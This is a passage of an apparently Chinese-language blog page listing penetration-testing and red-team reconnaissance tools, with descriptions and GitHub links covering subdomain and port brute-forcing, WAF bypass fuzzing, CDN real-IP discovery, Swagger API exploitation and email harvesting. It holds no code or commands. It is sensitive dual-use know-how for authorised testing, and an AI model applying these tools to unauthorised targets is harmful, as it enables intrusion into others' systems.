&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL20wc3dheS9KdUQtU2Nhbg==&#34;&gt;https://github.com/m0sway/JuD-Scan&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;searchmap&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#searchmap&#34;&gt;#&lt;/a&gt; SearchMap&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;searchmap 是一款集域名解析、IP 反查域名、WHOIS 查询、CDN 检测、端口扫描、目录扫描、子域名挖掘为一体的前渗透测试综合信息收集工具。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2FzYW90b21vL1NlYXJjaE1hcA==&#34;&gt;https://github.com/asaotomo/SearchMap&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;apolloscanner&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#apolloscanner&#34;&gt;#&lt;/a&gt; ApolloScanner&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;自动化巡航扫描框架（可用于红队打点评估）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2IwYmFjL0Fwb2xsb1NjYW5uZXI=&#34;&gt;https://github.com/b0bac/ApolloScanner&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;allin&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#allin&#34;&gt;#&lt;/a&gt; ALLiN&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;一个辅助平常渗透测试项目或者攻防项目快速打点的综合工具，由之前写的工具 AG3 改名而来。是一款轻便、小巧、快速、全面的扫描工具。多用于渗透前资产收集和渗透后内网横向渗透。工具从项目上迭代了一些懒人功能（比如提供扫描资产文件中，可以写绝大部分的各种形式的链接 / CIDR, 并在此基础上可以添加任意端口和路径）。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1AxLVRlYW0vQWxsaU4=&#34;&gt;https://github.com/P1-Team/AlliN&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;darkeye&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#darkeye&#34;&gt;#&lt;/a&gt; DarkEye&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;一款主机发现、网段发现、协议爆破、IP 域名碰撞的工具&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2IxZ2NhdC9EYXJrRXll&#34;&gt;https://github.com/b1gcat/DarkEye&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;wanli&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#wanli&#34;&gt;#&lt;/a&gt; WanLi&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;使用 Dirsearch, Subfinder, Ksubdomain, Httpx、nuclei 工具进行快速目标资产检查并对目标资产进行敏感文件、敏感路径、漏洞验证检测。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0V4cExhbmdjbi9XYW5MaQ==&#34;&gt;https://github.com/ExpLangcn/WanLi&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;autoscanner&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#autoscanner&#34;&gt;#&lt;/a&gt; Autoscanner&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;输入域名 &amp;gt; 爆破子域名 &amp;gt; 扫描子域名端口 &amp;gt; 发现扫描 web 服务 &amp;gt; 集成报告的全流程全自动扫描器。集成 oneforall、masscan、nmap、dirsearch、crawlergo、xray 等工具，另支持 cdn 识别、网页截图、站点定位；动态识别域名并添加功能、工具超时中断等&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3pvbmdkZWlxaWFueGluZy9BdXRvc2Nhbm5lcg==&#34;&gt;https://github.com/zongdeiqianxing/Autoscanner&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;securityservicebox&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#securityservicebox&#34;&gt;#&lt;/a&gt; SecurityServiceBox&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;一个既可以满足安服仔日常渗透工作也可以批量刷洞的工具盒子。集合了常见的域名收集、目录扫描、ip 扫描、指纹扫描、PoC 验证等常用工具，方便安服仔快速展开渗透测试&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2dpdmVtZWZpdncvU2VjdXJpdHlTZXJ2aWNlQm94&#34;&gt;https://github.com/givemefivw/SecurityServiceBox&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;domain_hunter_pro&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#domain_hunter_pro&#34;&gt;#&lt;/a&gt; domain_hunter_pro&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;domain_hunter 的高级版本，SRC 挖洞、HW 打点之必备！自动化资产收集；快速 Title 获取；外部工具联动；等等&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2JpdDR3b28vZG9tYWluX2h1bnRlcl9wcm8=&#34;&gt;https://github.com/bit4woo/domain_hunter_pro&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;enscan_go&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#enscan_go&#34;&gt;#&lt;/a&gt; ENScan_GO&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;一款基于各大企业信息 API 的工具，解决在遇到的各种针对国内企业信息收集难题。一键收集控股公司 ICP 备案、APP、小程序、微信公众号等信息聚合导出。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3dncHNlYy9FTlNjYW5fR08=&#34;&gt;https://github.com/wgpsec/ENScan_GO&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;reconftw&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#reconftw&#34;&gt;#&lt;/a&gt; ReconFTW&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;ReconFTW 为您自动化侦察的整个过程。它比子域枚举以及各种漏洞检查和获取关于目标的最大信息的工作更出色。该工具使用了很多技术 (被动，蛮力，排列，证书透明，源代码抓取，分析，DNS 记录等) 用于子域枚举，帮助你获得最大和最有趣的子域，使你在竞争中领先。它还执行各种漏洞检查，如 XSS、打开重定向、SSRF、CRLF、LFI、SQLi、SSL 测试、SSTI、DNS 区域传输等等。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3NpeDJkZXovcmVjb25mdHc=&#34;&gt;https://github.com/six2dez/reconftw&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;dismap&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dismap&#34;&gt;#&lt;/a&gt; dismap&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Dismap 定位是一个适用于内外网的资产发现和识别工具；其特色功能在于快速识别 Web 指纹信息，定位资产类型。辅助红队快速定位目标资产信息，辅助蓝队发现疑似脆弱点。&lt;br /&gt;
Dismap 拥有完善的指纹规则库，可轻松自定义新识别规则。&lt;br /&gt;
识别结果可直接丢给 Vulmap (&amp;gt;=0.8) 进行漏洞扫描实现简易联动。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3poenlrZXIvZGlzbWFw&#34;&gt;https://github.com/zhzyker/dismap&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;waf识别&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#waf识别&#34;&gt;#&lt;/a&gt; waf 识别&lt;/h2&gt;
&lt;h3 id=&#34;wafw00f&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#wafw00f&#34;&gt;#&lt;/a&gt; wafw00f&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;waf 识别工具&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0VuYWJsZVNlY3VyaXR5L3dhZncwMGY=&#34;&gt;https://github.com/EnableSecurity/wafw00f&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;waf-a-mole针对web应用防火墙的基于变异的模糊测试工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#waf-a-mole针对web应用防火墙的基于变异的模糊测试工具&#34;&gt;#&lt;/a&gt; WAF-A-MoLE：针对 Web 应用防火墙的基于变异的模糊测试工具&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;WAF-A-MoLE 是一款功能强大的基于变异的模糊测试工具，该工具可以帮助广大研究人员对基于 ML 的 Web 应用防火墙进行模糊测试。&lt;br /&gt;
只需提供一条 SQL 注入查询语句，该工具便能够尝试生成一个可绕过目标 WAF 的语义不变的变种查询。我们可以使用 WAF-A-MoLE 来探索解决方案空间，找到目标分类器未发现的危险 “盲点”，并且可以使用此工具评估产品的稳健性。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0F2YWxaL1dBRi1BLU1vTEU=&#34;&gt;https://github.com/AvalZ/WAF-A-MoLE&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;指纹识别&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#指纹识别&#34;&gt;#&lt;/a&gt; 指纹识别&lt;/h2&gt;
&lt;h3 id=&#34;tidefinger&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#tidefinger&#34;&gt;#&lt;/a&gt; TideFinger&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;TideFinger，一个开源的指纹识别小工具，使用了传统和现代检测技术相结合的指纹检测方法，让指纹检测更快捷、准确。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1RpZGVTZWMvVGlkZUZpbmdlcg==&#34;&gt;https://github.com/TideSec/TideFinger&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;cms指纹识别-cmseek&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cms指纹识别-cmseek&#34;&gt;#&lt;/a&gt; CMS 指纹识别 - CMSeek&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;一款 cms 指纹识别工具&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1R1aGluc2h1YmhyYS9DTVNlZUs=&#34;&gt;https://github.com/Tuhinshubhra/CMSeeK&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;cms指纹识别-webfinger&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cms指纹识别-webfinger&#34;&gt;#&lt;/a&gt; CMS 指纹识别 - Webfinger&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;web 指纹识别&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3NlNTVpMG4vV2ViZmluZ2Vy&#34;&gt;https://github.com/se55i0n/Webfinger&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;glass-指纹识别工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#glass-指纹识别工具&#34;&gt;#&lt;/a&gt; Glass - 指纹识别工具&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Glass 是一款针对资产列表的快速指纹识别工具，通过调用 Fofa/ZoomEye/Shodan/360 等 api 接口快速查询资产信息并识别重点资产的指纹，也可针对 IP/IP 段或资产列表进行快速的指纹识别。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3M3Y2tUZWFtL0dsYXNz&#34;&gt;https://github.com/s7ckTeam/Glass&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;ehole棱洞30-红队重点攻击系统指纹探测工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ehole棱洞30-红队重点攻击系统指纹探测工具&#34;&gt;#&lt;/a&gt; EHole (棱洞) 3.0 红队重点攻击系统指纹探测工具&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;EHole 是一款对资产中重点系统指纹识别的工具，在红队作战中，信息收集是必不可少的环节，如何才能从大量的资产中提取有用的系统 (如 OA、VPN、Weblogic...)。EHole 旨在帮助红队人员在信息收集期间能够快速从 C 段、大量杂乱的资产中精准定位到易被攻击的系统，从而实施进一步攻击。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0VkZ2VTZWN1cml0eVRlYW0vRUhvbGU=&#34;&gt;https://github.com/EdgeSecurityTeam/EHole&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;cdn识别&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cdn识别&#34;&gt;#&lt;/a&gt; CDN 识别&lt;/h2&gt;
&lt;h3 id=&#34;fuck-cdn&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#fuck-cdn&#34;&gt;#&lt;/a&gt; FUCK CDN&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;CDN 真实 IP 扫描&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1RhaTdzeS9mdWNrY2Ru&#34;&gt;https://github.com/Tai7sy/fuckcdn&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;w8fuckcdn&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#w8fuckcdn&#34;&gt;#&lt;/a&gt; w8fuckcdn&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;通过扫描全网绕过 CDN 获取网站 IP 地址&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2JveS1oYWNrL3c4ZnVja2Nkbi8=&#34;&gt;https://github.com/boy-hack/w8fuckcdn/&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;端口扫描&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#端口扫描&#34;&gt;#&lt;/a&gt; 端口扫描&lt;/h2&gt;
&lt;h3 id=&#34;跨平台小巧的端口爆破工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#跨平台小巧的端口爆破工具&#34;&gt;#&lt;/a&gt; 跨平台小巧的端口爆破工具&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;一款跨平台小巧的端口爆破工具，支持爆破 FTP/SSH/SMB/MSSQL/MYSQL/POSTGRESQL/MONGOD。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2F3YWtlMXQvUG9ydEJydXRl&#34;&gt;https://github.com/awake1t/PortBrute&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;kscan-简单好用的资产测绘工具端口指纹存活自动探测&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#kscan-简单好用的资产测绘工具端口指纹存活自动探测&#34;&gt;#&lt;/a&gt; Kscan - 简单好用的资产测绘工具 | 端口指纹存活自动探测&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Kscan 是一款轻量级的资产发现工具，可针对 IP/IP 段或资产列表进行端口扫描以及 TCP 指纹识别和 Banner 抓取，在不发送更多的数据包的情况下尽可能的获取端口更多信息。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2xjdnZ2di9rc2Nhbg==&#34;&gt;https://github.com/lcvvvv/kscan&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;scaninfo&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#scaninfo&#34;&gt;#&lt;/a&gt; scaninfo&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;开源、轻量、快速、跨平台 的红队内外网打点扫描器。快速的端口扫描和服务识别比 masscan 更快。包含 fscan 的绝大部份功能除了 poc 扫描和自定义字典&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3JlZHRvb2xza29iZS9zY2FuaW5mbw==&#34;&gt;https://github.com/redtoolskobe/scaninfo&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;域名扫描&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#域名扫描&#34;&gt;#&lt;/a&gt; 域名扫描&lt;/h2&gt;
&lt;h3 id=&#34;ksubdomain-子域爆破工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ksubdomain-子域爆破工具&#34;&gt;#&lt;/a&gt; ksubdomain - 子域爆破工具&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;ksubdomain 是一款基于无状态的子域名爆破工具，类似无状态端口扫描，支持在 Windows/Linux/Mac 上进行快速的 DNS 爆破，拥有重发机制不用担心漏包。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2JveS1oYWNrL2tzdWJkb21haW4=&#34;&gt;https://github.com/boy-hack/ksubdomain&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;oneforall&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#oneforall&#34;&gt;#&lt;/a&gt; OneForAll&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;OneForAll 是一款功能强大的子域收集工具&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3NobWlseWx0eS9PbmVGb3JBbGw=&#34;&gt;https://github.com/shmilylty/OneForAll&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;subfinder-快速被动子域枚举工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#subfinder-快速被动子域枚举工具&#34;&gt;#&lt;/a&gt; subfinder - 快速被动子域枚举工具&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;子域名是一种子域名发现工具，通过使用被动在线资源发现网站的有效子域名。它具有简单的模块化架构，并针对速度进行了优化。子查找器仅用于执行一件事 - 被动子域枚举，并且它做得很好。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3Byb2plY3RkaXNjb3Zlcnkvc3ViZmluZGVy&#34;&gt;https://github.com/projectdiscovery/subfinder&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;ksubdomain&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ksubdomain&#34;&gt;#&lt;/a&gt; ksubdomain&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;ksubdomain 是一款基于无状态子域名爆破工具，支持在 Windows/Linux/Mac 上使用，它会很快的进行 DNS 爆破，在 Mac 和 Windows 上理论最大发包速度在 30w/s,linux 上为 160w/s 的速度。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2JveS1oYWNrL2tzdWJkb21haW4=&#34;&gt;https://github.com/boy-hack/ksubdomain&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;layer&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#layer&#34;&gt;#&lt;/a&gt; Layer&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Layer 子域名挖掘机使用方法简单，在域名对话框中直接输入域名就可以进行扫描，它的显示界面比较细致，有域名、解析 IP、CDN 列表、WEB 服务器和网站状态&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubGlrZWNzLmNvbS9zaG93LTIwMzM5NjI3OS5odG1s&#34;&gt;https://www.likecs.com/show-203396279.html&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;subdomainsbrute&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#subdomainsbrute&#34;&gt;#&lt;/a&gt; subDomainsBrute&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;subDomainsBrute 的特点是可以用小字典递归地发现三级域名、四级域名，甚至五级域名等不容易被探测到的域名&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2xpamllamllL3N1YkRvbWFpbnNCcnV0ZS8=&#34;&gt;https://github.com/lijiejie/subDomainsBrute/&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;sublist3r&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sublist3r&#34;&gt;#&lt;/a&gt; sublist3r&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Sublist3r 也是一个比较常用的工具，它能列举多种资源，如在 Google、Yahoo、Bing、Baidu 和 Ask 等搜索引擎中可查到的子域名，还可以列出 Netcraft、VirusTotal、ThreatCrowd、DNSdumpster 和 Reverse DNS 查到的子域名&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2Fib3VsM2xhL1N1Ymxpc3Qzci8=&#34;&gt;https://github.com/aboul3la/Sublist3r/&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;dnsenum&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dnsenum&#34;&gt;#&lt;/a&gt; dnsenum&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;dnsenum 的目的是尽可能收集一个域的信息，它能够通过谷歌或者字典文件猜测可能存在的域名，并对一个网段进行反向查询。它不仅可以查询网站的主机地址信息、域名服务器和邮件交换记录，还可以在域名服务器上执行 axfr 请求，然后通过谷歌脚本得到扩展域名信息，提取子域名并查询，最后计算 C 类地址并执行 whois 查询，执行反向查询，把地址段写入文件&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2Z3YWV5dGVucy9kbnNlbnVtLw==&#34;&gt;https://github.com/fwaeytens/dnsenum/&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;目录扫描&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#目录扫描&#34;&gt;#&lt;/a&gt; 目录扫描&lt;/h2&gt;
&lt;h3 id=&#34;dirsearch&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dirsearch&#34;&gt;#&lt;/a&gt; dirsearch&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;一种高级命令行工具，旨在暴力破解 Web 服务器中的目录和文件，AKA Web 路径扫描程序&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL21hdXJvc29yaWEvZGlyc2VhcmNo&#34;&gt;https://github.com/maurosoria/dirsearch&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;crawler&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#crawler&#34;&gt;#&lt;/a&gt; Crawler&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;一些爬虫 demo，比如用于渗透测试中 SQL 注入的 URL 收集脚本 (爬取必应和百度搜索结果的 URL)，子域名暴破，各大高校漏洞信息收集爬虫等，以及入门爬虫时写的一些基础代码等&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2dnZmdoL0NyYXdsZXI=&#34;&gt;https://github.com/ggfgh/Crawler&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;jsfinder&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jsfinder&#34;&gt;#&lt;/a&gt; JSFinder&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;JSFinder 是一款优秀的 github 开源工具，这款工具功能就是查找隐藏在 js 文件中的 api 接口和敏感目录，以及一些子域名。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1RocmVlemgxL0pTRmluZGVy&#34;&gt;https://github.com/Threezh1/JSFinder&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;swagger-exp-信息泄露利用工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#swagger-exp-信息泄露利用工具&#34;&gt;#&lt;/a&gt; swagger-exp -- 信息泄露利用工具&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;这是一个 Swagger REST API 信息泄露利用工具。主要功能有：&lt;br /&gt;
1、遍历所有 API 接口，自动填充参数&lt;br /&gt;
 2、尝试 GET / POST 所有接口，返回 Response Code / Content-Type / Content-Length ，用于分析接口是否可以未授权访问利用&lt;br /&gt;
 3、分析接口是否存在敏感参数，例如 url 参数，容易引入外网的 SSRF 漏洞&lt;br /&gt;
 4、检测 API 认证绕过漏洞&lt;br /&gt;
 5、在本地监听一个 Web Server，打开 Swagger UI 界面，供分析接口使用 &amp;gt; 6、使用 Chrome 打开本地 Web 服务器，并禁用 CORS，解决部分 API 接口无法跨域请求的问题&lt;br /&gt;
 7、当工具检测到 HTTP 认证绕过漏洞时，本地服务器拦截 API 文档，修改 path，以便直接在 Swagger UI 中进行测试&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2xpamllamllL3N3YWdnZXItZXhw&#34;&gt;https://github.com/lijiejie/swagger-exp&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;arjun&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#arjun&#34;&gt;#&lt;/a&gt; Arjun&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Arjun 拥有一个包含 10,985 个参数名的巨大默认字典，在 10 秒内通过发送 20-30 个请求，找到该网站有效的 HTTP 参数，在渗透测试的信息收集阶段起很重要的作用&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3MwbWQzdi9Bcmp1bg==&#34;&gt;https://github.com/s0md3v/Arjun&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;caesar&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#caesar&#34;&gt;#&lt;/a&gt; Caesar&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;文件扫描是安服的一个基本环节，网络上关于文件扫描的工具也有很多，比如御剑，7kbscan，dirsearch 等，但是在实战的时候还是遇到不少的问题，比如跨平台问题以及动态 404 问题。所以按照自己的经验重新造了一个轮子。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tLzBwcy9DYWVzYXI=&#34;&gt;https://github.com/0ps/Caesar&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;邮箱收集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#邮箱收集&#34;&gt;#&lt;/a&gt; 邮箱收集&lt;/h2&gt;
&lt;h3 id=&#34;mailget&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#mailget&#34;&gt;#&lt;/a&gt; Mailget&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;通过脉脉用户猜测企业邮箱&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3JpZHRlci9tYWlsZ2V0&#34;&gt;https://github.com/ridter/mailget&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;infoga&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#infoga&#34;&gt;#&lt;/a&gt; Infoga&lt;/h3&gt;
&lt;blockquote&gt;
